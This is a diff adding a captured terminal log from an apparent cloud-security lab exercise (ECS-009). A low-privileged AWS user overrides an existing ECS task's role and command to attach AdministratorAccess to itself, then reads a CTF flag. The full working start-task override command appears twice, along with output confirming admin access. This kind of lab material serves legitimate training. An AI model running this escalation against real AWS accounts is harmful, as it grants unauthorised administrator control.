@@ -1,0 +1,201 @@
+[0;32m========================================[0m
+[0;32mIAM PassRole + ECS StartTask Override[0m
+[0;32mPrivilege Escalation Demo (ECS-009)[0m
+[0;32m========================================[0m
+
+[0;34mThis scenario exploits an EXISTING task definition by overriding[0m
+[0;34mthe container command and task role via ecs:StartTask --overrides.[0m
+[0;34mNo new task definition is registered - the attacker only needs[0m
+[0;34miam:PassRole and ecs:StartTask. A container instance already exists.[0m
+
+[1;33mStep 1: Retrieving scenario configuration from Terraform[0m
+Retrieved access key for: pl-prod-ecs-009-to-admin-starting-user
+Access Key ID: AKIA2E4JP2...
+Region: us-east-1
+ECS Cluster: pl-prod-ecs-009-cluster
+Target Role ARN: arn:aws:iam::123456789012:role/pl-prod-ecs-009-to-admin-target-role
+Existing Task Definition: arn:aws:ecs:us-east-1:123456789012:task-definition/pl-prod-ecs-009-existing-task:2
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[1;33m[demo_permissions] Restricting helpful permissions for validation...[0m
+  Denied helpful permissions on user: pl-prod-ecs-009-to-admin-starting-user
+[1;33m[demo_permissions] Waiting 15s for IAM policy propagation...[0m
+[0;32m[demo_permissions] Helpful permissions restricted[0m
+[1;33mStep 2: Configuring AWS CLI with starting user credentials[0m
+Using region: us-east-1
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-ecs-009-to-admin-starting-user
+[0;32m✓ Verified starting user identity[0m
+
+[1;33mStep 3: Getting account ID[0m
+[2m[Attacker] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Retrieved account ID[0m
+
+[1;33mStep 4: Verifying we don't have admin permissions yet[0m
+Attempting to list IAM users (should fail)...
+[2m[Attacker] $ aws iam list-users --max-items 1[0m
+[0;32m✓ Confirmed: Cannot list IAM users (as expected)[0m
+
+[1;33mStep 5: Checking current policies attached to starting user[0m
+Listing attached policies for: pl-prod-ecs-009-to-admin-starting-user
+[2m[ReadOnly] $ aws iam list-attached-user-policies --user-name pl-prod-ecs-009-to-admin-starting-user --query 'AttachedPolicies[*].PolicyName' --output text[0m
+No managed policies currently attached
+[0;32m✓ Verified current policy state[0m
+
+[1;33mStep 6: Discovering existing task definitions in the cluster[0m
+Listing task definitions with family prefix: pl-prod-ecs-009-existing-task
+[2m[ReadOnly] $ aws ecs list-task-definitions --region us-east-1 --family-prefix pl-prod-ecs-009-existing-task --query 'taskDefinitionArns' --output json[0m
+Found task definitions:
+arn:aws:ecs:us-east-1:123456789012:task-definition/pl-prod-ecs-009-existing-task:2
+
+[0;34mKey insight: We do NOT need ecs:RegisterTaskDefinition.[0m
+[0;34mWe will exploit the existing task definition using ecs:StartTask --overrides[0m
+[0;34mto override both the command AND the taskRoleArn.[0m
+[0;32m✓ Identified existing task definition to exploit[0m
+
+[1;33mStep 7: Retrieving container instance ARN from ECS cluster[0m
+Cluster: pl-prod-ecs-009-cluster
+[2m[ReadOnly] $ aws ecs list-container-instances --region us-east-1 --cluster pl-prod-ecs-009-cluster --query 'containerInstanceArns[0]' --output text[0m
+Container Instance ARN: arn:aws:ecs:us-east-1:123456789012:container-instance/pl-prod-ecs-009-cluster/92bfd7f9f1ee4514b803fad0af0aa6ff
+[0;32m✓ Retrieved container instance ARN[0m
+
+[1;33mStep 8: Starting ECS task with command and role overrides[0m
+Cluster: pl-prod-ecs-009-cluster
+Task Definition: pl-prod-ecs-009-existing-task
+Container Instance: arn:aws:ecs:us-east-1:123456789012:container-instance/pl-prod-ecs-009-cluster/92bfd7f9f1ee4514b803fad0af0aa6ff
+
+[0;34mOverrides being applied:[0m
+  - taskRoleArn: arn:aws:iam::123456789012:role/pl-prod-ecs-009-to-admin-target-role (admin role)
+  - command: aws iam attach-user-policy --user-name pl-prod-ecs-009-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+This task will attach AdministratorAccess policy to: pl-prod-ecs-009-to-admin-starting-user
+
+
+[0;36m[Attacker] $ aws ecs start-task --region us-east-1 --cluster pl-prod-ecs-009-cluster --task-definition pl-prod-ecs-009-existing-task --container-instances arn:aws:ecs:us-east-1:123456789012:container-instance/pl-prod-ecs-009-cluster/92bfd7f9f1ee4514b803fad0af0aa6ff --overrides '{
+  "taskRoleArn": "arn:aws:iam::123456789012:role/pl-prod-ecs-009-to-admin-target-role",
+  "containerOverrides": [
+    {
+      "name": "pl-prod-ecs-009-benign-container",
+      "command": [
+        "iam",
+        "attach-user-policy",
+        "--user-name",
+        "pl-prod-ecs-009-to-admin-starting-user",
+        "--policy-arn",
+        "arn:aws:iam::aws:policy/AdministratorAccess"
+      ]
+    }
+  ]
+}'[0m
+Task ARN: arn:aws:ecs:us-east-1:123456789012:task/pl-prod-ecs-009-cluster/d2c0c5dceb5041a4a2df05ef82ba0060
+[0;32m✓ Successfully started ECS task with overridden command and role![0m
+
+[1;33mStep 9: Waiting for ECS task to complete[0m
+Monitoring task status...
+[2m[ReadOnly] $ aws ecs describe-tasks --region us-east-1 --cluster pl-prod-ecs-009-cluster --tasks arn:aws:ecs:us-east-1:123456789012:task/pl-prod-ecs-009-cluster/d2c0c5dceb5041a4a2df05ef82ba0060 --output json[0m
+Attempt 1: Task status: PENDING (desired: RUNNING)
+[2m[ReadOnly] $ aws ecs describe-tasks --region us-east-1 --cluster pl-prod-ecs-009-cluster --tasks arn:aws:ecs:us-east-1:123456789012:task/pl-prod-ecs-009-cluster/d2c0c5dceb5041a4a2df05ef82ba0060 --output json[0m
+Attempt 2: Task status: PENDING (desired: RUNNING)
+[2m[ReadOnly] $ aws ecs describe-tasks --region us-east-1 --cluster pl-prod-ecs-009-cluster --tasks arn:aws:ecs:us-east-1:123456789012:task/pl-prod-ecs-009-cluster/d2c0c5dceb5041a4a2df05ef82ba0060 --output json[0m
+Attempt 3: Task status: RUNNING (desired: RUNNING)
+[2m[ReadOnly] $ aws ecs describe-tasks --region us-east-1 --cluster pl-prod-ecs-009-cluster --tasks arn:aws:ecs:us-east-1:123456789012:task/pl-prod-ecs-009-cluster/d2c0c5dceb5041a4a2df05ef82ba0060 --output json[0m
+Attempt 4: Task status: STOPPED (desired: STOPPED)
+Task stopped with code: EssentialContainerExited
+Container exit code: 0
+[0;32m✓ Task completed successfully![0m
+
+[1;33mStep 10: Waiting for IAM policy changes to propagate[0m
+IAM changes can take time to propagate across AWS infrastructure...
+[0;32m✓ IAM policy propagation complete[0m
+
+[1;33mStep 11: Verifying policy attachment[0m
+Checking attached policies for: pl-prod-ecs-009-to-admin-starting-user
+[2m[ReadOnly] $ aws iam list-attached-user-policies --user-name pl-prod-ecs-009-to-admin-starting-user --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' --output text[0m
+Currently attached policies:
+AdministratorAccess	arn:aws:iam::aws:policy/AdministratorAccess
+[0;32m✓ AdministratorAccess policy successfully attached![0m
+
+[1;33mStep 12: Verifying administrator access[0m
+Attempting to list IAM users...
+[2m[Attacker] $ aws iam list-users --max-items 3 --output table[0m
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+|                                                                                    ListUsers                                                                                   |
++----------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+
+|  NextToken                 |  eyJNYXJrZXIiOiBudWxsLCAiYm90b190cnVuY2F0ZV9hbW91bnQiOiAzfQ==                                                                                     |
++----------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+
+||                                                                                     Users                                                                                    ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+||                             Arn                             |      CreateDate       |   PasswordLastUsed    | Path  |        UserId          |           UserName            ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582225 |  2026-03-03T23:57:05Z |                       |  /    |  AIDA2E4JP2KMDN764OVDX |  pathrunner-admin-1772582225  ||
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582487 |  2026-03-04T00:01:27Z |                       |  /    |  AIDA2E4JP2KMIGZOBA63O |  pathrunner-admin-1772582487  ||
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582552 |  2026-03-04T00:02:32Z |  2026-03-04T00:04:42Z |  /    |  AIDA2E4JP2KMGNBJR4AJO |  pathrunner-admin-1772582552  ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+[0;32m✓ Successfully listed IAM users![0m
+[0;32m✓ ADMIN ACCESS CONFIRMED[0m
+
+[1;33mStep 13: Capturing CTF flag from SSM Parameter Store[0m
+
+[0;36m[Attacker (now admin)] $ aws ssm get-parameter --name /pathfinding-labs/flags/ecs-009-to-admin --query 'Parameter.Value' --output text[0m
+[0;32m✓ Flag captured: flag{ecs_009_admin_captured}[0m
+
+[1;33m[demo_permissions] Restoring helpful permissions...[0m
+  Restored user: pl-prod-ecs-009-to-admin-starting-user
+[0;32m[demo_permissions] Helpful permissions restored[0m
+
+[0;32m========================================[0m
+[0;32m✅ CTF FLAG CAPTURED![0m
+[0;32m========================================[0m
+
+[1;33mAttack Summary:[0m
+1. Started as: pl-prod-ecs-009-to-admin-starting-user (with iam:PassRole, ecs:StartTask)
+2. Discovered pre-existing task definition: pl-prod-ecs-009-existing-task
+3. Found container instance registered to cluster: pl-prod-ecs-009-cluster
+4. Used ecs:StartTask with --overrides to:
+   a. Override taskRoleArn to admin role: pl-prod-ecs-009-to-admin-target-role
+   b. Override container command to attach AdministratorAccess to starting user
+5. ECS task executed with admin role, attaching AdministratorAccess policy
+6. Achieved: Administrator Access
+7. Captured CTF flag from SSM Parameter Store: flag{ecs_009_admin_captured}
+
+[1;33mAttack Path:[0m
+  pl-prod-ecs-009-to-admin-starting-user → (PassRole + StartTask with --overrides on existing task def)
+  → ECS Task with pl-prod-ecs-009-to-admin-target-role → AttachUserPolicy
+  → pl-prod-ecs-009-to-admin-starting-user gains AdministratorAccess → Admin
+  → (ssm:GetParameter) → CTF Flag
+
+[1;33mKey Differences:[0m
+  vs ECS-005: No ecs:RegisterTaskDefinition needed - overrides existing task definition
+  vs ECS-007: No ecs:RegisterContainerInstance needed - container instance already exists
+  vs ECS-008: Uses EC2 launch type (ecs:StartTask) instead of Fargate (ecs:RunTask)
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws ecs start-task --region us-east-1 --cluster pl-prod-ecs-009-cluster --task-definition pl-prod-ecs-009-existing-task --container-instances arn:aws:ecs:us-east-1:123456789012:container-instance/pl-prod-ecs-009-cluster/92bfd7f9f1ee4514b803fad0af0aa6ff --overrides '{
+  "taskRoleArn": "arn:aws:iam::123456789012:role/pl-prod-ecs-009-to-admin-target-role",
+  "containerOverrides": [
+    {
+      "name": "pl-prod-ecs-009-benign-container",
+      "command": [
+        "iam",
+        "attach-user-policy",
+        "--user-name",
+        "pl-prod-ecs-009-to-admin-starting-user",
+        "--policy-arn",
+        "arn:aws:iam::aws:policy/AdministratorAccess"
+      ]
+    }
+  ]
+}'[0m
+  [0;36m$ aws ssm get-parameter --name /pathfinding-labs/flags/ecs-009-to-admin --query 'Parameter.Value' --output text[0m
+
+[1;33mAttack Artifacts:[0m
+- ECS Cluster: pl-prod-ecs-009-cluster
+- Task ARN: arn:aws:ecs:us-east-1:123456789012:task/pl-prod-ecs-009-cluster/d2c0c5dceb5041a4a2df05ef82ba0060
+- Policy attached to user: AdministratorAccess
+
+[0;31m⚠ Warning: The starting user now has AdministratorAccess policy attached[0m
+
+[1;33mTo clean up and restore the original state:[0m
+  ./cleanup_attack.sh or use the plabs TUI/CLI
+
